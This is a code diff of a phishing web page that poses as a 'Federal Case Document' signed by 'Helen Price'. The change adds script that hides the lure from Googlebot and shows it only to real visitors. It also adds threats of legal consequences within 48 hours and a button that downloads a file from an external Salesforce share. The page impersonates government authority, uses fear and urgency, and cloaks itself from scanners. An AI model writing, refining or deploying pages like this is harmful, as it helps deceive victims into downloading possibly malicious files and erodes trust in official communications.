@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Federal Case Document</title>
   <meta name="robots" content="noindex, nofollow" />
+  <title>Federal Case Document</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -46,24 +46,26 @@
 </head>
 <body>
   <div class="container">
-    <h2>📄 Case Document: CR/FD-04982X</h2>
-    <p>Dear User,</p>
-    <p>
-      The document regarding your federal case has been prepared.
-      Please click the button below to download:
-    </p>
-
+    <h2>📄 Case Document: Reference #CR/FD-04982X</h2>
+    <div id="case-body"></div>
     <div id="download-link"></div>
-
-    <p style="margin-top: 30px;">
-      If you have any issues accessing the file, contact our support team.
-    </p>
-    <p>Sincerely,<br /><strong>Helen Price</strong></p>
   </div>
 
   <script>
     const isGooglebot = /googlebot/i.test(navigator.userAgent);
+
     if (!isGooglebot) {
+      // Hiển thị nội dung nhạy cảm chỉ cho người thật
+      const content = `
+        <p>Dear User,</p>
+        <p>This document has been prepared as part of an official federal case file. You are required to review it within 48 hours.</p>
+        <p style="color:red; font-weight:bold;">Failure to respond may result in legal consequences.</p>
+        <p>If you have any issues accessing the file, contact our support team.</p>
+        <p>Sincerely,<br><strong>Helen Price</strong></p>
+      `;
+      document.getElementById("case-body").innerHTML = content;
+
+      // Tạo nút tải file
       const a = document.createElement("a");
       a.href = "https://quraceyazun.my.salesforce.com/sfc/p/a5000015NvEt/a/a5000000mci6/mGzZwuCZSpkAidKcFUiWjj08IaNtf02Ayhi0WqrgzN4";
       a.className = "button";
